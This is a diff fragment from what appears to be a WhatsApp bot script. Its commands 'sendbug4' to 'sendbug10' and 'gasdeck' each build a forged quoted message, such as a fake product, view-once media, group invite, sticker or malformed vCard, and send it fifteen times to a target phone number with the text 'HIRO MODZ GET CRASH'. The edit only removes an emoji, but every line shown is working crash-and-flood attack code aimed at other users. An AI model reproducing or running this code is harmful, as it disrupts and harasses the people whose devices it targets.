+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fvoc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fvoc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fvoc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fvoc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fvoc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fvoc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fvoc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fvoc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fvoc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fvoc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fvoc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fvoc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fvoc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fvoc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fvoc})
 await m.reply(`Succes`)
 break
 case 'sendbug4':
@@ -5451,21 +5451,21 @@ message: { "videoMessage": {
 }
 }
 }
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fgif})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fgif})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fgif})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fgif})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fgif})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fgif})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fgif})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fgif})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fgif})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fgif})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fgif})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fgif})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fgif})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fgif})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fgif})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fgif})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fgif})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fgif})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fgif})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fgif})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fgif})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fgif})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fgif})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fgif})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fgif})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fgif})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fgif})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fgif})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fgif})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fgif})
 await m.reply(`Succes`)
 break 
 case 'sendbug5':
@@ -5482,21 +5482,21 @@ jpegThumbnail: fs.readFileSync(`./pict.jpg`),
 }
 }
 }
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:floc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:floc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:floc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:floc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:floc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:floc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:floc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:floc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:floc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:floc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:floc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:floc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:floc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:floc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:floc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:floc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:floc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:floc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:floc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:floc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:floc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:floc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:floc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:floc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:floc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:floc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:floc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:floc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:floc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:floc})
 await m.reply(`Succes`)
 break
 case 'sendbug6':
@@ -5520,21 +5520,21 @@ message: {
 "retailerId": "© Hiro Modz", 
 "productImageCount": 1}, 
 "businessOwnerJid": `6283149877456@s.whatsapp.net`}}}	
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:ftoko})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:ftoko})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:ftoko})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:ftoko})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:ftoko})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:ftoko})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:ftoko})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:ftoko})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:ftoko})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:ftoko})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:ftoko})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:ftoko})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:ftoko})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:ftoko})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:ftoko})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:ftoko})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:ftoko})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:ftoko})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:ftoko})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:ftoko})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:ftoko})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:ftoko})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:ftoko})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:ftoko})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:ftoko})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:ftoko})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:ftoko})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:ftoko})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:ftoko})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:ftoko})
 await m.reply(`Succes`)
 break
 case 'sendbug7':
@@ -5552,21 +5552,21 @@ viewOnce: true
 },
 },
 };
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:foncevid})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:foncevid})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:foncevid})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:foncevid})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:foncevid})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:foncevid})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:foncevid})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:foncevid})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:foncevid})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:foncevid})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:foncevid})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:foncevid})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:foncevid})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:foncevid})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:foncevid})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:foncevid})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:foncevid})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:foncevid})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:foncevid})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:foncevid})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:foncevid})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:foncevid})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:foncevid})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:foncevid})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:foncevid})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:foncevid})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:foncevid})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:foncevid})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:foncevid})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:foncevid})
 await m.reply(`Succes`)
 break
 case 'sendbug8':
@@ -5583,21 +5583,21 @@ viewOnce: true
 },
 },
 };
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fonceimg})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fonceimg})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fonceimg})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fonceimg})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fonceimg})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fonceimg})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fonceimg})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fonceimg})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fonceimg})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fonceimg})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fonceimg})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fonceimg})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fonceimg})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fonceimg})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fonceimg})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fonceimg})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fonceimg})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fonceimg})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fonceimg})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fonceimg})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fonceimg})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fonceimg})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fonceimg})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fonceimg})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fonceimg})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fonceimg})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fonceimg})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fonceimg})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fonceimg})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fonceimg})
 await m.reply(`Succes`)
 break
 case 'sendbug9':
@@ -5615,21 +5615,21 @@ participant: `0@s.whatsapp.net`, ...({ remoteJid: "" })
 "groupName": "P",
 "caption": `© Hiro Modz`,
  'jpegThumbnail': fs.readFileSync('./pict.jpg')}}}
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fgc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fgc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fgc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fgc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fgc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fgc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fgc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fgc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fgc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fgc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fgc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fgc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fgc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fgc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fgc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fgc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fgc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fgc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fgc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fgc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fgc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fgc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fgc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fgc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fgc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fgc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fgc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fgc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fgc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fgc})
 await m.reply(`Succes`)
 break
 case 'sendbug10':
@@ -5658,21 +5658,21 @@ let stic = {
 "messageTimestamp": "1614070775",
 "status": "PENDING"
  }
- haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:stic})
- haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:stic})
- haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:stic})
- haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:stic})
- haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:stic})
- haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:stic})
- haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:stic})
- haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:stic})
- haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:stic})
- haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:stic})
- haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:stic})
- haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:stic})
- haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:stic})
- haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:stic})
- haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:stic})
+ haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:stic})
+ haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:stic})
+ haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:stic})
+ haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:stic})
+ haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:stic})
+ haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:stic})
+ haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:stic})
+ haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:stic})
+ haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:stic})
+ haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:stic})
+ haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:stic})
+ haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:stic})
+ haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:stic})
+ haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:stic})
+ haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:stic})
  await m.reply(`Succes`)
 break 
 case 'gasdeck':
@@ -5686,21 +5686,21 @@ message: { "contactMessage": {
 "displayName": `© Hiro Modz`,
  "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:;Masih gw pikirin;;;\nFN:Masih gw pikirin\nitem1.TEL;waid=35312338989:+353 1 233 8989\nitem1.X-ABLabel:Telepon\nX-WA-BIZ-NAME:No ku +353\nEND:VCARD\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+359996400\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;xnxx;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\;CHARSET=UTF-8\;type=HOME\,INTERNET\;ac;\nitem4.X-ABADR:\nitem4.X-ABLabel:Casa\nitem5.X-WHATSAPP;type=INTERNET:EMAIL;CRASHED=UTF-8;type=HOME,INTERNET:+\nitem5.X-ABLabel:INTERNET\nEND:VCARD`, 
  "jpegThumbnail": fs.readFileSync('./pict.jpg')}}}
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fkon})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fkon})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fkon})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fkon})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fkon})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fkon})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fkon})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fkon})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fkon})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fkon})
